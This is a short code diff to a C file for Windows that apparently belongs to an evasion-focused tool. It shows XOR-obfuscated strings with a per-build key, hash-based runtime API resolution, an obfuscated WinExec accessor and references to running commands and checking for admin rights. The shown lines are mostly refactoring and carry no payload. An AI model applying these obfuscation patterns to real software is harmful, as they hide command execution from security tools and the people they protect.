@@ -7,20 +7,18 @@
  */
 
 #include <windows.h>
+#include <tlhelp32.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include "obf.h"
 
 /* XOR key — change this per build */
 #define XOR_KEY 0x7A
 
 /* Forward declarations for string accessors */
-static char* get_str(unsigned char *enc, size_t len);
+char* get_str(unsigned char *enc, size_t len);
 char* obf_winexec(void);
-
-/* Forward declarations for functions from sys.c / engine.h */
-extern char* sys_run_command(const char *cmd);
-extern int sys_is_admin(void);
 
 /* Simple djb2 hash for API name resolution */
 static unsigned long djb2_hash(const unsigned char *str) {
@@ -186,7 +184,7 @@ static FARPROC resolve_api(HMODULE hMod, unsigned long hash) {
 }
 
 /* Get decoded string from encoded buffer */
-static char* get_str(unsigned char *enc, size_t len) {
+char* get_str(unsigned char *enc, size_t len) {
     static char buf[256];
     memcpy(buf, enc, len);
     xor_decode(buf, len);
